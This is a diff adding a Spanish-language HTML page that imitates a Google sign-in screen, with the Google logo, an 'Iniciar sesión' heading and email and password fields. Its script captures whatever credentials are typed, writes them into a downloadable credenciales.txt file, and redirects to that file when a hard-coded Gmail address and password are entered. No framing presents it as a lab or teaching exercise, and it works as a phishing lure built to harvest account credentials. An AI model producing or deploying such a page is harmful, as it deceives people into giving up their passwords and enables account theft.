@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guardar credenciales en texto</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f7fc;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .form-container {
+            background-color: #ffffff;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .google-logo {
+            width: 40px;
+            margin-bottom: 20px;
+        }
+
+        input {
+            padding: 12px;
+            margin: 12px 0;
+            width: 100%;
+            font-size: 16px;
+            border: 2px solid #ccc;
+            border-radius: 8px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            border-color: #fbb034; /* Amarillo */
+            outline: none;
+        }
+
+        button {
+            padding: 14px 24px;
+            font-size: 16px;
+            background-color: #4285f4; /* Azul Google */
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #357ae8; /* Azul más oscuro */
+        }
+
+        .alert {
+            margin-top: 15px;
+            padding: 10px;
+            background-color: #f8d7da;
+            color: #721c24;
+            border-radius: 5px;
+            text-align: center;
+            display: none;
+        }
+
+        /* Diseño responsive */
+        @media (max-width: 600px) {
+            .form-container {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        <!-- Logo de Google -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/Google_2015_logo.svg/1024px-Google_2015_logo.svg.png" alt="Google Logo" class="google-logo">
+        
+        <h1>Iniciar sesión</h1>
+        <input type="email" id="gmail" placeholder="Correo electrónico" required>
+        <input type="password" id="password" placeholder="Contraseña" required>
+        <button onclick="procesarCredenciales()">Iniciar sesión</button>
+
+        <div class="alert" id="alert-message">Por favor ingresa un correo y contraseña válidos.</div>
+    </div>
+
+    <script>
+        let credencialesGuardadas = [];
+
+        function procesarCredenciales() {
+            const gmail = document.getElementById("gmail").value;
+            const password = document.getElementById("password").value;
+
+            // Validar si se ingresaron las credenciales
+            if (!gmail || !password) {
+                showAlert("Por favor ingresa un correo y contraseña válidos.");
+                return;
+            }
+
+            // Verificar si las credenciales son correctas
+            if (gmail === "security728273@gmail.com" && password === "mario112233") {
+                alert("Credenciales correctas, redirigiendo...");
+                window.location.href = "credenciales.txt"; // En un entorno real, este archivo debería estar disponible
+            } else {
+                // Si las credenciales son incorrectas, agregar las credenciales al arreglo
+                credencialesGuardadas.push(`Gmail: ${gmail} Contraseña: ${password}`);
+
+                // Crear el contenido del archivo credenciales.txt
+                let contenidoTxt = "";
+                credencialesGuardadas.forEach(cred => {
+                    contenidoTxt += cred + "\n";
+                });
+
+                // Crear un Blob con el contenido del archivo de texto
+                const blob = new Blob([contenidoTxt], { type: 'text/plain' });
+
+                // Descargar el archivo generado
+                saveAs(blob, "credenciales.txt");
+                showAlert("Archivo creado con las credenciales ingresadas.");
+            }
+        }
+
+        // Función para mostrar alertas
+        function showAlert(message) {
+            const alertElement = document.getElementById("alert-message");
+            alertElement.textContent = message;
+            alertElement.style.display = "block";
+
+            // Ocultar la alerta después de 4 segundos
+            setTimeout(() => {
+                alertElement.style.display = "none";
+            }, 4000);
+        }
+    </script>
+
+</body>
+</html>
